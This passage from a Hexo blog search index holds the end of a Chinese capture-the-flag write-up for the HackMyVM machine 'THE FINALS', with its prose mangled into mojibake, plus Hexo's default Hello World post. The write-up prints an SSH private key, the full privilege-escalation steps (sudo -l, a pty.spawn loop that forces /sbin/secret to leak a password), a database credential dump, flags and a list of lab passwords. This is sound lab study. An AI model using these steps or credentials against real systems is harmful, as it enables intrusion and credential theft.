-user scotty 2&gt;/dev/null<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/log/scotty-main.log<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ—¥å¿—ï¼Œå…¨æ˜¯ç»™192.168.11.255çš„å¹¿æ’­ä¿¡æ¯ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_pwkX2gTEvV.png"></p><p>ç”¨ncæœ¬åœ°ç›‘å¬1337ç«¯å£ï¼Œæ‹¿åˆ°ä¸€ä¸²ä¸çŸ¥é“æ˜¯ä»€ä¹ˆçš„å­—ç¬¦ä¸²ï¼Œä¸è¿‡è‚¯å®šæ˜¯ç¼–ç è¿‡äº†ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_mPH6XDjVlM.png"></p><p>èµ›åšå¨å­magicä¸€ä¸‹ï¼Œç»“æœè¿™æ˜¯ç”¨æˆ·çš„ç§é’¥æ–‡ä»¶ï¼Œç»“åˆåˆšåˆšçš„ä¿¡æ¯ï¼Œå¯ä»¥sshç™»scottyäº†ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/msedge_gaM3rV5NQC.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEwAAAJgDc/YUA3P2<br>FAAAAAtzc2gtZWQyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEw<br>AAAECv7kfeoXOQCi5CRIWdHiDT5upKyY3vQxAlKmxEQzRZLDXCfT3imE6qx9uj6jcIFiI3<br>fEDXrKYpJtfZRjfbH8ATAAAAEnJvb3RAdGhlZmluYWxzLmhtdgECAw==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_byqcEA4MVJ.png"></p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>çœ‹ä¸€ä¸‹è¿™ä¸ªç”¨æˆ·æœ‰ä»€ä¹ˆæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> scotty on thefinals:<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>Runas and Command-specific defaults <span class="hljs-keyword">for</span> scotty:<br>    Defaults!/usr/sbin/visudo env_keep+=<span class="hljs-string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span><br><br>User scotty may run the following commands on thefinals:<br>    (ALL) NOPASSWD: /sbin/secret<br></code></pre></td></tr></table></figure><p>å¥½å§ï¼Œnopasswdåªæœ‰ä¸€ä¸ªï¼Œé‚£å°±ç”¨å§ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~$ <span class="hljs-built_in">sudo</span> /sbin/secret<br>/sbin/secret: line 2: can<span class="hljs-string">&#x27;t create /dev/pts/99: Permission denied</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_5gL49eMJDw.png"></p><p>è°”è°”ä½ è®©æˆ‘åˆ›å»ºåˆ°ç¬¬99ä¸ªshellå—ï¼Œé‚£å¾ˆæœ‰æ‰‹é€Ÿäº†ã€‚</p><p>ç¼–å†™è„šæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in $(seq 1 90); do python -c &#x27;import pty; pty.spawn(&quot;/bin/ash&quot;)&#x27; &amp; done<br></code></pre></td></tr></table></figure><p>ä¹‹åå†æ¬¡æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ $ <span class="hljs-built_in">sudo</span> /sbin/secret<br>root:p8RuoQGTtlKLAjuF1Tpy5wX<br></code></pre></td></tr></table></figure><p>ç»ˆäºæ‹¿åˆ°rootå¯†ç äº†ï¼Œsshçˆ½è¿â€¦â€¦ä¸äº†ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_6NaGPVcFYR-1748483267238-18.png"></p><p>åŸæ¥æ˜¯mysqlçš„å¯†ç ã€‚</p><p>ä½¿ç”¨rootè´¦æˆ·å°±å¯ä»¥è®¿é—®secretæ•°æ®åº“äº†ï¼Œä»userè¡¨ä¸­æ‹¿åˆ°çœŸçš„rootå¯†ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Database changed<br>MariaDB [typecho_db]&gt; use secret;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [secret]&gt; show tables;<br>+------------------+<br>| Tables_in_secret |<br>+------------------+<br>| user             |<br>+------------------+<br>1 row in set (0.000 sec)<br><br>MariaDB [secret]&gt; select * from user;<br>+----+----------+-------------------------+<br>| id | username | password                |<br>+----+----------+-------------------------+<br>|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |<br>+----+----------+-------------------------+<br>1 row in set (0.000 sec)<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_3mFOyhfZWa.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">thefinals:~# <span class="hljs-built_in">cat</span> root.flag <br> _____      __   __      ______<br>/\  __\    /\ <span class="hljs-string">&quot;-.\ \    /\  ___\</span><br><span class="hljs-string">\ \ \___   \ \ \-.  \   \ \___  \</span><br><span class="hljs-string"> \ \____\   \ \_\\&quot;</span>\_\   \ \_____\<br>  \/____/    \/_/ \/_/    \/_____/<br><br>flag&#123;8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff&#125;<br><br>thefinals:~# <span class="hljs-built_in">cat</span> note.txt <br>ssh://root@thefinals.hmv:BvIpFDyB4kNbkyqJGwMzLcK<br>ssh://staff@thefinals.hmv:qDCsBTj30cQyityMh3Rnyys<br>ssh://june@thefinals.hmv:aYTmcORsUrmwaKa7C2DBLCh<br>ssh://scotty@thefinals.hmv:uuUoqAETern4v5tW2iMFs47<br><br>mariadb://root@localhost:p8RuoQGTtlKLAjuF1Tpy5wX<br><br>mariadb://typecho_u@typecho_db@localhost:QLTkbviW71CSRZtGWIQdB6s<br><br>typecho://staff@thefinals.hmv:n3nPbqEOhs6eTcchyqXTXWi<br>typecho://june@thefinals.hmv:DihPQiQqNO75vv8zNBzLwUm<br><br>flag&#123;4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298&#125;<br>canyoureachthefinals -&gt; sha256<br><br>flag&#123;8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff&#125;<br>youfinallyreachedthefinals -&gt; sha256<br><br>THE FINALS is a great FPS game. A lot of inspiration comes from games. Try it on http://reachthefinals.com/<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªé¶æœºæ‰“çš„è¿˜æ˜¯æŒºçˆ½çš„ï¼ŒXSSæ¼æ´ä¸€ç›´ä¸æ˜¯å¾ˆæ‡‚ï¼Œé€šè¿‡è¿™ä¸€æ¬¡å¤ä¹ äº†ä¸€ä¸‹ã€‚</p><p>å—¯è¿™è¾¹æˆ‘ä¸çŸ¥é“é‚£ä¸ªxssåˆ©ç”¨æ˜¯ä¸æ˜¯åªèƒ½åå¼¹shellï¼Œå½“æ—¶æˆ‘æƒ³å†™ä¸€å¥è¯é©¬ç”¨èšå‰‘æˆ–è€…å†°èè¿ä½†æ˜¯è€è¿ä¸ä¸Šï¼Œä½†æ˜¯ä¸Šé¢åšå®¢é‡Œçš„expæ˜¯æœ‰ç”¨postå®ç°rceçš„å¤ç°çš„ï¼Œå¯èƒ½è¿™ä¸ªé¶æœºæ˜¯åšäº†äº›é™åˆ¶è¿˜æ˜¯ä»€ä¹ˆã€‚</p><p>ä¹‹åæˆ‘çœ‹äº†LingMJå¤§ä½¬çš„wpï¼Œå‘ç°ä»–å°±æ˜¯ç”¨çš„èšå‰‘ç»ƒçš„posté©¬ï¼Œåªæ˜¯è¿æ¥å¯†ç ä¸ä¸€æ ·ï¼Œæ‰€ä»¥åº”è¯¥ä¸æ˜¯é¶æœºçš„é—®é¢˜ï¼Œå¯èƒ½æˆ‘è¿™è¾¹å†™å…¥shellçš„æ–¹å¼æœ‰ç‚¹é—®é¢˜å§ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/21/hello-world/"/>
    <url>/2025/02/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
